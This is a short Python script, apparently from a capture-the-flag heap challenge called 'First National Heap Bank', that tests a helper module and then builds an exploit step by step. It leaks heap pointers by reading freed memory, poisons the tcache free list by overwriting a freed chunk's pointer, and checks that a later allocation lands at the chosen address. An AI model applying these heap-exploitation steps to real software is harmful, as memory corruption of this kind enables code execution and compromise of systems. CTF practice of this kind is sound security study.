#!/usr/bin/env python3
import sys, struct
sys.path.insert(0, '/home/boss/Works/ctf/Zero_trace/First_nATIONAL_HEAP_bANK')
from bank import Bank, u64, p64

# test raw null bytes handling and 0x10 poison
b = Bank(timeout=8)
payload = p64(0x1122334455667788) + p64(0xdeadbeef)
r = b.open(0, 0x10, payload)
d = b.view(0)
print('roundtrip', d.hex(), 'ok', d == payload)

# heap leak via tcache
b.open(1, 0x10, b'A'*0x10)
b.open(2, 0x10, b'B'*0x10)
b.close(1); b.close(2)
d2 = b.view(2)
print('view2', d2[:16].hex())
s1 = u64(d2[:8])
heap = u64(d2[8:16]) - 0x10
print('s1', hex(s1), 'heap', hex(heap))
T = s1 + 0x20  # next chunk in 0x20 class
b.amend(2, p64(T) + b'Z'*8)
print('poisoned')
b.open(3, 0x10, b'3'*0x10)
d3 = b.view(3)
print('view3', d3[:16].hex())
b.open(4, 0x10, b'4'*0x10)
d4 = b.view(4)
print('view4', d4[:16].hex(), 'expect', T)
